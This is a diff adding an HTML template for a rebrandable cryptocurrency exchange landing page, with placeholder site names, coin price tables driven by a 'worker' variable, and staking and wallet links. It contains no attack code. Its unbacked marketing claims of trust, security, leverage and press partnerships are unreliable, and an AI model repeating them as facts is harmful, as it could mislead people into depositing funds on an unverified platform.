@@ -1,0 +1,574 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title th:text="${site_title}"></title>
+  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link rel="stylesheet" href="npm/swiper%409/swiper-bundle.min.css">
+  <link rel="icon" th:href="${site_icon}">
+  <link rel="stylesheet" href="landings/2/style/normalize.css">
+  <link rel="stylesheet" href="landings/2/style/global.css">
+  <link rel="stylesheet" href="landings/2/style/header.css">
+  <link rel="stylesheet" href="landings/2/style/home.css">
+  <link rel="stylesheet" href="landings/2/style/coins.css">
+  <link rel="stylesheet" href="landings/2/style/gateway.css">
+  <link rel="stylesheet" href="landings/2/style/stats.css">
+  <link rel="stylesheet" href="landings/2/style/freedom.css">
+  <link rel="stylesheet" href="landings/2/style/cryptocurrencies.css">
+  <link rel="stylesheet" href="landings/2/style/started.css">
+  <link rel="stylesheet" href="landings/2/style/benefits.css">
+  <link rel="stylesheet" href="landings/2/style/partners.css">
+  <link rel="stylesheet" href="landings/2/style/footer.css">
+  <link rel="icon" th:href="${site_icon}">
+  <link rel="shortcut icon" th:href="${site_icon}">
+</head>
+<body>
+
+<div class="container__global">
+  <div class="main__global">
+    <header class="header">
+      <div class="header__container">
+        <a class="header__logo" href="#">
+          <img style="width: 30px; height: 30px;" th:src="${site_icon}" alt="">
+          <th:block th:text="${site_name}"></th:block>
+        </a>
+        <div class="header__wrapper">
+          <div class="header__center">
+            <a class="header__link" href="profile/trading">Trading</a>
+            <a class="header__link" href="profile/p2p">P2P</a>
+            <a class="header__link" href="profile/staking">Staking</a>
+            <a class="header__link" href="profile/wallet">Wallet</a>
+            <a class="header__link hot" href="profile/swap">Swap</a>
+          </div>
+          <div class="header__right">
+            <a th:if="${user == null}" class="header__link-log" href="signin">Log in</a>
+            <a th:if="${user == null}" class="header__link-up" href="signup">Sign up</a>
+            <a th:if="${user != null}" class="header__link-up" href="profile/wallet">Profile</a>
+          </div>
+        </div>
+        <div class="header__btn-mobile">
+          <svg width="35" height="35" viewbox="0 0 100 100">
+            <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
+            <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
+            <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
+          </svg>
+        </div>
+      </div>
+    </header>
+
+    <section class="home">
+      <div class="home__wrapper">
+        <div class="home__container">
+          <div class="home__box">
+            <div class="home__left">
+              <div class="home__title">
+                <div>Buy, <span>stake & trade</span></div>
+                on the most trusted
+                crypto  exchange
+              </div>
+              <div class="home__description">
+                <th:block th:text="${site_name}"></th:block> has pioneered the concept of seamless
+                trading of different cryptocurrency assets.
+              </div>
+              <a class="home__link-start" href="trading">Start trading</a>
+              <a class="home__link-invest" href="profile/staking">Stake</a>
+            </div>
+            <div class="home__right">
+              <div class="image-block">
+                <div class="image">
+                  <div class="image-shadow" style="background-image: url('landings/2/images/home/iph.png');"></div>
+                  <img src="landings/2/images/home/iph.png">
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+        <div class="home__arrow-one">
+          <img src="landings/2/images/home/arrow-one-bg.svg" alt="">
+        </div>
+        <div class="home__arrow-two">
+          <img src="landings/2/images/home/arrow-two-bg.svg" alt="">
+        </div>
+        <div class="home__arrow-three">
+          <img src="landings/2/images/home/arrow-three-bg.svg" alt="">
+        </div>
+        <div class="home__arrow-four">
+          <img src="landings/2/images/home/arrow-four-bg.svg" alt="">
+        </div>
+      </div>
+    </section>
+
+    <section class="coins">
+      <div class="coins__container">
+        <div class="coins__slider-container">
+          <div class="coins__slider swiper swiper-initialized swiper-horizontal swiper-pointer-events">
+            <div class="swiper-wrapper" id="swiper-wrapper-47edbbbbd6895ae2" aria-live="off" style="transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;">
+              <th:block th:each="i : ${#numbers.sequence(0, (coins.size() < 9 ? coins.size() : 9))}">
+              <div class="coins__slide swiper-slide swiper-slide-duplicate" data-swiper-slide-index="0" role="group" th:aria-label="${i + 1} + ' / 10'" style="margin-right: 11px;">
+                <th:block th:with="coin = ${coins.get(i)}">
+                  <div class="coins__slide-coin">
+                    <img th:src="${coin.icon}" alt="" th:text="${coin.title}" style="width: 44px; height: 44px;" >
+                  </div>
+                  <div class="coins__slide-price" th:text="'$' + ${coin_service.getWorkerPriceFormatted(worker, coin.symbol)}"></div>
+                  <th:block th:with="changePercent = ${coin_service.getWorkerPriceChangePercent(worker, coin.symbol)}">
+                    <div class="coins__slide-change" th:text="'$' + ${coin_service.toDecimalUsd(coin_service.getWorkerPriceChange(worker, coin.symbol))} + ' (' + ${changePercent} + '%)'" th:classappend="${changePercent >= 0 ? 'coins__slide-change-plus' : ''}"></div>
+                    <div class="coins__slide-graph">
+                      <svg th:if="${changePercent < 0}" width="250" height="78" viewBox="0 0 250 78" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1.09985 42.7408L3.09985 43.7397C5.53243 44.6391 10.2347 46.2981 15.0999 49.7329C19.965 53.1678 25.2347 58.5775 30.0999 62.7183C34.965 66.8591 39.2347 69.9841 44.0999 64.7161C48.965 59.448 54.2347 45.387 59.0999 46.7363C63.965 48.0856 68.2347 64.4744 73.0999 71.7082C77.965 78.942 83.2347 76.9894 88.0999 74.7048C92.965 72.4202 98.2347 69.8162 103.1 62.7183C107.965 55.6205 112.235 44.3964 117.1 39.7442C121.965 35.092 127.235 36.8325 132.1 32.752C136.965 28.6715 141.235 18.8074 146.1 14.7723C150.965 10.7371 156.235 12.8977 161.1 18.7678C165.965 24.6379 171.235 34.0667 176.1 33.7509C180.965 33.4351 185.235 23.5328 190.1 22.7633C194.965 21.9937 200.235 30.6725 205.1 38.7453C209.965 46.818 214.235 54.4224 219.1 48.7341C223.965 43.0458 229.235 23.8824 234.1 13.7734C238.965 3.66439 243.667 2.35573 246.1 1.78687H249.1" stroke="#FF6489" stroke-width="2"></path>
+                      </svg>
+                      <svg th:if="${changePercent >= 0}" width="251" height="79" viewBox="0 0 251 79" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M249.1 43.71L247.1 44.7082C244.667 45.6213 239.965 47.2103 235.1 50.6972C230.235 54.1841 224.965 59.4699 220.1 63.6734C215.235 67.8769 210.965 71.0176 206.1 65.6697C201.235 60.3219 195.965 46.3329 191.1 47.7027C186.235 49.0725 181.965 65.3135 177.1 72.6569C172.235 80.0004 166.965 77.9707 162.1 75.6514C157.235 73.3322 151.965 70.8788 147.1 63.6734C142.235 56.468 137.965 45.4382 133.1 40.7155C128.235 35.9928 122.965 37.8706 118.1 33.7283C113.235 29.586 108.965 18.8594 104.1 14.7631C99.2347 10.6668 93.965 12.7967 89.0999 18.7558C84.2347 24.7148 78.965 35.047 74.0999 34.7265C69.2347 34.4059 64.965 23.5297 60.0999 22.7484C55.2347 21.9672 49.965 30.5241 45.0999 38.7192C40.2347 46.9142 35.965 55.4735 31.0999 49.699C26.2347 43.9245 20.965 24.0271 16.0999 13.7649C11.2347 3.50271 6.53243 2.36435 4.09985 1.78687L1.09985 1.78687" stroke="#31AC7C" stroke-width="2" stroke-linecap="round"></path>
+                      </svg>
+                    </div>
+                  </th:block>
+                  <div class="coins__slide-date" th:text="${date}"></div>
+                </th:block>
+              </div>
+              </th:block>
+            </div>
+            <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
+          <div class="coins__slider-prev" tabindex="0" role="button" aria-label="Previous slide" aria-controls="swiper-wrapper-47edbbbbd6895ae2"></div>
+          <div class="coins__slider-next" tabindex="0" role="button" aria-label="Next slide" aria-controls="swiper-wrapper-47edbbbbd6895ae2"></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="gateway">
+      <div class="gateway__container">
+        <div class="gateway__title">
+          World class trading platform
+        </div>
+        <div class="gateway__description">
+          We rank top among first tier exchanges with the highest number of listed crypto
+        </div>
+
+        <div class="gateway__table">
+          <div class="gateway__table-items">
+            <div class="gateway__table-item" th:each="i : ${#numbers.sequence(0, (coins.size() < 9 ? coins.size() : 9))}">
+              <th:block th:with="coin = ${coins.get(i)}">
+              <div class="gateway__table-number" th:text="${i + 1}"></div>
+              <div class="gateway__table-name">
+                <img th:src="${coin.icon}" alt="" style="width: 44px; height: 44px;" >
+                <div th:text="${coin.title} + ' '"><span th:text="${coin.symbol}"></span></div>
+              </div>
+              <div class="gateway__table-price" th:text="'$' + ${coin_service.getWorkerPriceFormatted(worker, coin.symbol)}"></div>
+                <th:block th:with="changePercent = ${coin_service.getWorkerPriceChangePercent(worker, coin.symbol)}">
+                  <div class="gateway__table-change" th:classappend="${changePercent >= 0 ? ('gateway_' + '_table-' + 'change-plus') : 'gateway_' + '_table-' + 'change-minus'}" th:text="${changePercent} + '%'"></div>
+                </th:block>
+              <div class="gateway__table-trade">
+                <a class="gateway__table-trade-link" th:href="'trading?currency=' + ${coin.symbol}">Trade</a>
+              </div>
+              </th:block>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="freedom">
+      <div class="freedom__container">
+        <div class="freedom__box">
+          <div class="freedom__left">
+            <img src="landings/2/images/freedom/phone.webp" alt="">
+          </div>
+          <div class="freedom__right">
+            <div class="freedom__title">
+              Delivering
+              <span>Financial Freedom</span>
+            </div>
+            <div class="freedom__description">
+              Our products set the standard for security, compliance,
+              experience, and investor protection.
+            </div>
+            <div class="freedom__benefits">
+              <div class="freedom__benefit">
+                <div class="freedom__benefit-img">
+                  <img src="landings/2/images/freedom/Chart-up.webp" alt="">
+                </div>
+                <div class="freedom__benefit-text">
+                  <th:block th:text="${site_name}"></th:block> allows up to 10x leverage trading by providing
+                  traders with access to the peer-to-peer funding market.
+                </div>
+              </div>
+
+              <div class="freedom__benefit">
+                <div class="freedom__benefit-img">
+                  <img src="landings/2/images/freedom/security.webp" alt="">
+                </div>
+                <div class="freedom__benefit-text">
+                  Our exchange makes it simple to research the crypto market,
+                  buy bitcoin and other cryptos, and build a portfolio for the
+                  future of money.
+                </div>
+              </div>
+
+              <div class="freedom__benefit">
+                <div class="freedom__benefit-img">
+                  <img src="landings/2/images/freedom/perfomance.webp" alt="">
+                </div>
+                <div class="freedom__benefit-text">
+                  A high-performance crypto trading platform that
+                  delivers professional-level experience.
+                </div>
+              </div>
+
+              <div class="freedom__benefit">
+                <div class="freedom__benefit-img">
+                  <img src="landings/2/images/freedom/bitcoin.webp" alt="">
+                </div>
+                <div class="freedom__benefit-text">
+                  Store and manage your digital assets using the most secure,
+                  compliant, and user-friendly custody solution on the market.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="cryptocurrencies">
+      <div class="cryptocurrencies__container">
+        <div class="cryptocurrencies__title">
+          Select From <div>Over <span>150</span></div> Cryptocurrencies
+        </div>
+        <div class="cryptocurrencies__description">
+          Trade BTC, ETH and other cryptocurrencies in minutes.
+        </div>
+
+        <div class="cryptocurrencies__coins">
+          <div class="cryptocurrencies__coins-track" id="track-one">
+            <img src="landings/2/images/cryptocurrencies/coins.webp" alt="">
+
+            <img src="landings/2/images/cryptocurrencies/coins.webp" alt="">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="started">
+      <div class="started__container">
+        <div class="started__title">Get Started</div>
+        <div class="started__description">
+          Join the fastest growing global cryptocurrency exchange
+          - with the lowest fees around
+        </div>
+
+        <div class="started__cards">
+          <div class="started__card started__card-one">
+            <div class="started__card-img">
+              <img src="landings/2/images/started/create-img.png" alt="">
+            </div>
+            <div class="started__card-title">Create an account</div>
+            <div class="started__card-description">
+              Create your free account with a quick
+              verification process. It’s easy, we promise
+            </div>
+          </div>
+
+          <div class="started__card started__card-two">
+            <div class="started__card-img">
+              <img src="landings/2/images/started/deposit-img.png" alt="">
+            </div>
+            <div class="started__card-title">Make a deposit</div>
+            <div class="started__card-description">
+              Dip a toe or go all in. Usually it takes no
+              more than 5 min to deposit with crypto
+            </div>
+          </div>
+
+          <div class="started__card started__card-three">
+            <div class="started__card-img">
+              <img src="landings/2/images/started/start-img.png" alt="">
+            </div>
+            <div class="started__card-title">Start trading</div>
+            <div class="started__card-description">
+              Trade spot or derivatives with up to
+              100x leverage. Access over 150 pairs
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="benefits">
+      <div class="benefits__container">
+
+        <div class="benefits__top">
+          <div class="benefits__top-box">
+            <div class="benefits__top-left">
+              <div class="benefits__sub-title">Institutional-grade cold storage system</div>
+              <div class="benefits__title">Secure Crypto Wallet</div>
+              <div class="benefits__des">Our safe, secure wallet infrastructure supports all our listed assets. Invest confidently, knowing that our wallets are protected by <th:block th:text="${site_name}"></th:block> industry-leading security and protection.</div>
+              <a href="profile/wallet" class="benefits__link">
+                Wallet
+                <svg width="13" height="13" viewbox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M12.7529 7.04786C13.0602 6.74057 13.0602 6.24234 12.7529 5.93505L7.74523 0.927388C7.43793 0.620093 6.93971 0.620093 6.63241 0.927388C6.32512 1.23468 6.32512 1.73291 6.63241 2.0402L11.0837 6.49146L6.63241 10.9427C6.32512 11.25 6.32512 11.7482 6.63241 12.0555C6.93971 12.3628 7.43793 12.3628 7.74523 12.0555L12.7529 7.04786ZM0.393311 7.27833H12.1965V5.70458H0.393311V7.27833Z" fill="#847AE7"></path>
+                </svg>
+              </a>
+            </div>
+            <img class="benefits__top-img" src="landings/2/images/benefits/benefits_1.webp" alt="">
+          </div>
+
+          <div class="benefits__bottom-box">
+            <div class="benefits__bottom-right">
+              <div class="benefits__sub-title">Trade anywhere anytime</div>
+              <div class="benefits__title">Trade spot, margin and stake.
+                All in one powerful interface.</div>
+              <div class="benefits__des">Turn into a professional trader via our one-stop services platform with powerful features, high execution speed and low fees. Buy and trade all your favorite tokens  effortlessly, anytime and anywhere.</div>
+              <a href="trading" class="benefits__link">
+                Start trading
+                <svg width="13" height="13" viewbox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M12.7529 7.04786C13.0602 6.74057 13.0602 6.24234 12.7529 5.93505L7.74523 0.927388C7.43793 0.620093 6.93971 0.620093 6.63241 0.927388C6.32512 1.23468 6.32512 1.73291 6.63241 2.0402L11.0837 6.49146L6.63241 10.9427C6.32512 11.25 6.32512 11.7482 6.63241 12.0555C6.93971 12.3628 7.43793 12.3628 7.74523 12.0555L12.7529 7.04786ZM0.393311 7.27833H12.1965V5.70458H0.393311V7.27833Z" fill="#847AE7"></path>
+                </svg>
+              </a>
+            </div>
+            <img class="benefits__bottom-img" src="landings/2/images/benefits/benefits_2.webp" alt="">
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section class="partners">
+      <div class="partners__container">
+        <div class="partners__logos">
+          <div class="partners__logo">
+            <img src="landings/2/images/partners/forbes.svg" alt="">
+          </div>
+
+          <div class="partners__logo">
+            <img src="landings/2/images/partners/gizmodo.svg" alt="">
+          </div>
+
+          <div class="partners__logo">
+            <img src="landings/2/images/partners/guardian.svg" alt="">
+          </div>
+
+          <div class="partners__logo">
+            <img src="landings/2/images/partners/ft.svg" alt="">
+          </div>
+
+          <div class="partners__logo">
+            <img src="landings/2/images/partners/insider.svg" alt="">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <style type="text/css">
+      .footer {
+        background: #121212;
+      }
+      .footer__container {
+        max-width: 1271px;
+        padding: 80px 15px 25px 15px;
+        margin: 0 auto;
+      }
+      .footer__logo-top {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        margin-bottom: 3px;
+      }
+      .footer__logo-icon {
+        margin-right: 15px;
+      }
+      .footer__logo-text {
+        font-size: 26px;
+        line-height: 30px;
+        color: #FFFFFF;
+        text-transform: uppercase;
+      }
+      .footer__top {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        padding-bottom: 26px;
+      }
+      .footer__links {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-pack: justify;
+        -ms-flex-pack: justify;
+        justify-content: space-between;
+        margin-left: 206px;
+        width: 100%;
+        padding-top: 26px;
+        padding-right: 52px;
+      }
+      .footer__info {
+        max-width: 240px;
+      }
+      .footer__description {
+        font-size: 12px;
+        line-height: 15px;
+        letter-spacing: 0.02em;
+        color: rgba(232, 232, 232, 0.7);
+        margin-top: 23px;
+        margin-bottom: 47px;
+      }
+      .footer__label {
+        font-weight: 400;
+        font-size: 14px;
+        line-height: 15px;
+        color: rgba(232, 232, 232, 0.7);
+        margin-bottom: 17px;
+      }
+      .footer__wrapper {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+      }
+      .footer__input {
+        font-size: 12px;
+        line-height: 14px;
+        color: #A8A8A8;
+        background: #232323;
+        border: 1px solid #373737;
+        border-radius: 5px;
+        outline: none;
+        padding: 8px 10px 8px 11px;
+        max-width: 139px;
+      }
+      .footer__sing-up {
+        font-weight: 400;
+        font-size: 14px;
+        line-height: 16px;
+        color: #FFFFFF;
+        padding: 7px 18px 7px 19px;
+        background: #6544C6;
+        border-radius: 5px;
+        margin-left: 10px;
+      }
+      .footer__link-title {
+        font-size: 16px;
+        line-height: 16px;
+        letter-spacing: 0.02em;
+        color: #FFFFFF;
+        margin-bottom: 24px;
+      }
+      .footer__links-wrapper {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        row-gap: 9px;
+      }
+      .footer__link {
+        font-size: 14px;
+        line-height: 20px;
+        letter-spacing: 0.02em;
+        color: rgba(232, 232, 232, 0.7);
+      }
+      .footer__link:hover {
+        color: #fff;
+      }
+      .footer__bottom {
+        padding-top: 30px;
+        border-top: 1px solid rgba(196, 196, 196, 0.75);
+      }
+      .footer__sub-text {
+        font-size: 9px;
+        line-height: 15px;
+        color: rgba(232, 232, 232, 0.7);
+        max-width: 1200px;
+        margin: 0 auto;
+        text-align: center;
+      }
+
+      @media (max-width: 1100px) {
+        .footer__links {
+          margin-left: 90px;
+          padding-right: 30px;
+        }
+      }
+      @media (max-width: 870px) {
+        .footer__top {
+          -webkit-box-orient: vertical;
+          -webkit-box-direction: normal;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+        }
+        .footer__links {
+          margin-left: 0;
+          padding-right: 0;
+          max-width: 700px;
+          -ms-flex-wrap: wrap;
+          flex-wrap: wrap;
+        }
+        .footer__logo-top {
+          -webkit-box-pack: center;
+          -ms-flex-pack: center;
+          justify-content: center;
+        }
+        .footer__info {
+          max-width: 600px;
+          text-align: center;
+        }
+        .footer__description {
+          margin-bottom: 30px;
+        }
+        .footer__wrapper {
+          -webkit-box-pack: center;
+          -ms-flex-pack: center;
+          justify-content: center;
+        }
+      }
+      @media (max-width: 550px) {
+        .footer__links {
+          -webkit-column-gap: 50px;
+          -moz-column-gap: 50px;
+          column-gap: 50px;
+          row-gap: 50px;
+          max-width: 100%;
+        }
+        .footer__links-block {
+          min-width: 90px;
+        }
+      }
+
+      .footer__links {
+        flex-direction: unset !important;
+      }
+
+      .footer__logo {
+        display: block !important;
+      }
+
+      .footer__logo-text {
+        margin-left: -4px !important;
+      }
+    </style>
+    <div th:replace="~{fragments/footer-infoi-index.html :: footer-info}">
+    </div>
+
+    <!-- END FOOTER -->
+    <script src="assets/js/jquery-3.4.1.min.js"></script>
+    <script src="assets/js/app.min.js"></script>
+    <script src="assets/js/toastr.js"></script>
+
+  </div></div></body>
+</html>
+<script src="npm/swiper%409/swiper-bundle.min.js"></script>
+<script src="landings/2/js/header.js"></script>
+<script src="landings/2/js/cryptocurrencies.js"></script>
+<script src="landings/2/js/coins.js"></script>
